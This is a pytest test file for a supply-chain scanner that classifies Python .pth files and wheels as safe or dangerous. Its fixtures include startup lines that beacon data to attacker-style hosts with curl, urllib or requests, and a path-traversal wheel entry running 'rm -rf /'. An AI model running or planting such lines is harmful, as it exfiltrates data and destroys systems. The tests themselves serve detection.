"""
Tests for .pth semantic analysis and edge cases.
Verifies that legitimate packages don't generate false positives.
"""
import pytest
import zipfile
import tempfile
from pathlib import Path

from chaincanary.analyzer.static import StaticAnalyzer
from chaincanary.analyzer.pth_analyzer import analyze_pth_content, PthClass
from chaincanary.models import Severity


def make_wheel(name: str, version: str, files: dict) -> Path:
    tmpdir = Path(tempfile.mkdtemp())
    whl = tmpdir / f"{name}-{version}-py3-none-any.whl"
    with zipfile.ZipFile(whl, "w") as zf:
        for fname, content in files.items():
            zf.writestr(fname, content)
    return whl


class TestPthAnalyzer:
    """Unit tests for the .pth semantic classifier."""

    def test_empty_pth_is_safe(self):
        a = analyze_pth_content("")
        assert a.pth_class == PthClass.EMPTY

    def test_whitespace_only_pth_is_safe(self):
        a = analyze_pth_content("   \n  \n")
        assert a.pth_class == PthClass.EMPTY

    def test_pure_path_is_safe(self):
        a = analyze_pth_content("/usr/local/lib/python3.11/site-packages\n")
        assert a.pth_class == PthClass.PATH_ONLY

    def test_windows_path_is_safe(self):
        a = analyze_pth_content(r"C:\Python311\Lib\site-packages")
        assert a.pth_class == PthClass.PATH_ONLY

    def test_setuptools_shim_is_safe_code(self):
        """setuptools distutils shim should be SAFE_CODE, not DANGEROUS."""
        content = (
            "import os; var = 'SETUPTOOLS_USE_DISTUTILS'; "
            "enabled = os.environ.get(var, 'local') == 'local'; "
            "enabled and __import__('_distutils_hack').add_shim()"
        )
        a = analyze_pth_content(content, "setuptools")
        assert a.pth_class == PthClass.SAFE_CODE
        assert not a.risk_signals

    def test_litellm_attack_is_dangerous(self):
        """LiteLLM 1.82.7 attack pattern must be DANGEROUS."""
        content = (
            "import subprocess,sys;"
            "subprocess.Popen(['curl','-s','https://models.litellm.cloud/beacon',"
            "'-d',sys.version],stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)"
        )
        a = analyze_pth_content(content, "litellm")
        assert a.pth_class == PthClass.DANGEROUS
        assert len(a.risk_signals) >= 1

    def test_urllib_in_pth_is_dangerous(self):
        a = analyze_pth_content(
            "import urllib.request; urllib.request.urlopen('http://evil.com')"
        )
        assert a.pth_class == PthClass.DANGEROUS

    def test_requests_in_pth_is_dangerous(self):
        a = analyze_pth_content(
            "import requests; requests.get('http://c2.evil.com/beacon')"
        )
        assert a.pth_class == PthClass.DANGEROUS


class TestFalsePositives:
    """
    Verify that legitimate packages don't generate CRITICAL findings.
    These are the false positives that would kill user trust.
    """

    def setup_method(self):
        self.static = StaticAnalyzer()

    def test_empty_pth_no_critical(self):
        """Empty .pth file (like pytest-cov) must not be CRITICAL."""
        whl = make_wheel("pytest-cov", "4.0.0", {
            "pytest_cov/__init__.py": "# ok",
            "pytest-cov.pth": "",
        })
        findings = self.static.analyze_wheel(whl)
        critical = [f for f in findings if f.severity == Severity.CRITICAL]
        assert critical == [], f"False positive: {[f.rule_id for f in critical]}"

    def test_setuptools_shim_not_critical(self):
        """setuptools distutils-precedence.pth must not be CRITICAL."""
        whl = make_wheel("setuptools", "69.0.0", {
            "setuptools/__init__.py": "# ok",
            "distutils-precedence.pth": (
                "import os; var = 'SETUPTOOLS_USE_DISTUTILS'; "
                "enabled = os.environ.get(var, 'local') == 'local'; "
                "enabled and __import__('_distutils_hack').add_shim()"
            ),
        })
        findings = self.static.analyze_wheel(whl, "setuptools")
        critical = [f for f in findings if f.severity == Severity.CRITICAL]
        assert critical == [], f"False positive on setuptools: {[f.rule_id for f in critical]}"
        # Should only have LOW at most
        highs = [f for f in findings if f.severity in (Severity.HIGH, Severity.CRITICAL)]
        assert highs == []

    def test_pure_path_pth_no_finding(self):
        """Pure filesystem path .pth must produce zero findings."""
        whl = make_wheel("mylib", "1.0.0", {
            "mylib/__init__.py": "# ok",
            "mylib.pth": "/usr/local/lib/python3.11/site-packages\n",
        })
        findings = self.static.analyze_wheel(whl)
        assert findings == [], f"Unexpected finding: {[f.rule_id for f in findings]}"

    def test_normal_package_no_findings(self):
        """Clean package with no hooks and no network code = zero findings."""
        whl = make_wheel("mylib", "1.0.0", {
            "mylib/__init__.py": "def hello(): return 'world'",
            "mylib/utils.py": "import os\ndef get_path(): return os.getcwd()",
            "mylib/client.py": (
                "import requests\n"
                "class Client:\n"
                "    def fetch(self, url): return requests.get(url)\n"
            ),
        })
        findings = self.static.analyze_wheel(whl)
        critical_or_high = [f for f in findings
                            if f.severity in (Severity.CRITICAL, Severity.HIGH)]
        assert critical_or_high == []

    def test_coverage_pth_not_critical(self):
        """coverage.py style .pth (runs its own startup hook) must not be CRITICAL."""
        whl = make_wheel("coverage", "7.4.0", {
            "coverage/__init__.py": "# coverage",
            "coverage.pth": "import coverage; coverage.process_startup()",
        })
        findings = self.static.analyze_wheel(whl, "coverage")
        critical = [f for f in findings if f.severity == Severity.CRITICAL]
        assert critical == [], f"False positive on coverage: {[f.rule_id for f in critical]}"


class TestDelayedTriggerDetection:
    """Test detection of payloads hidden in __init__.py."""

    def setup_method(self):
        self.static = StaticAnalyzer()

    def test_network_in_init_detected(self):
        """Network call in __init__.py should be flagged as MEDIUM."""
        whl = make_wheel("sneaky", "1.0.0", {
            "sneaky/__init__.py": (
                "import urllib.request\n"
                "urllib.request.urlopen('http://c2.evil.com')\n"
            ),
        })
        findings = self.static.analyze_wheel(whl)
        rule_ids = [f.rule_id for f in findings]
        assert "INIT_NETWORK_CALL" in rule_ids

    def test_init_network_severity_is_medium(self):
        whl = make_wheel("sneaky", "1.0.0", {
            "sneaky/__init__.py": "import requests; requests.get('http://evil.com')",
        })
        findings = self.static.analyze_wheel(whl)
        init_finding = next((f for f in findings if f.rule_id == "INIT_NETWORK_CALL"), None)
        assert init_finding is not None
        assert init_finding.severity == Severity.MEDIUM


class TestZipSafety:
    """Test protection against malicious wheel files."""

    def setup_method(self):
        self.static = StaticAnalyzer()

    def test_path_traversal_detected(self):
        """Wheel containing path traversal must be flagged."""
        tmpdir = Path(tempfile.mkdtemp())
        whl = tmpdir / "evil-1.0.0-py3-none-any.whl"
        with zipfile.ZipFile(whl, "w") as zf:
            zf.writestr("evil/__init__.py", "# ok")
            # Manually add a path traversal entry
            info = zipfile.ZipInfo("../../evil_file.py")
            zf.writestr(info, "import os; os.system('rm -rf /')")
        findings = self.static.analyze_wheel(whl)
        rule_ids = [f.rule_id for f in findings]
        assert "WHEEL_PATH_TRAVERSAL" in rule_ids

    def test_path_traversal_is_critical(self):
        tmpdir = Path(tempfile.mkdtemp())
        whl = tmpdir / "evil-1.0.0-py3-none-any.whl"
        with zipfile.ZipFile(whl, "w") as zf:
            info = zipfile.ZipInfo("../escape.py")
            zf.writestr(info, "malicious")
        findings = self.static.analyze_wheel(whl)
        traversal = next((f for f in findings if f.rule_id == "WHEEL_PATH_TRAVERSAL"), None)
        assert traversal is not None
        assert traversal.severity == Severity.CRITICAL


class TestLockfileParser:
    """Tests for requirements.txt parsing."""

    def test_parse_pinned_requirements(self):
        from chaincanary.lockfile import parse_requirements_txt
        content = "litellm==1.82.7\nrequests==2.28.0\nnumpy>=1.24\n"
        tmpdir = Path(tempfile.mkdtemp())
        req_file = tmpdir / "requirements.txt"
        req_file.write_text(content)

        specs = parse_requirements_txt(req_file)
        pinned = [s for s in specs if s.version is not None]
        assert len(pinned) == 2
        names = {s.name for s in pinned}
        assert "litellm" in names
        assert "requests" in names

    def test_skip_comments_and_flags(self):
        from chaincanary.lockfile import parse_requirements_txt
        content = (
            "# This is a comment\n"
            "-r other.txt\n"
            "--index-url https://pypi.org/simple\n"
            "flask==2.3.0\n"
        )
        tmpdir = Path(tempfile.mkdtemp())
        req_file = tmpdir / "requirements.txt"
        req_file.write_text(content)

        specs = parse_requirements_txt(req_file)
        assert len(specs) == 1
        assert specs[0].name == "flask"
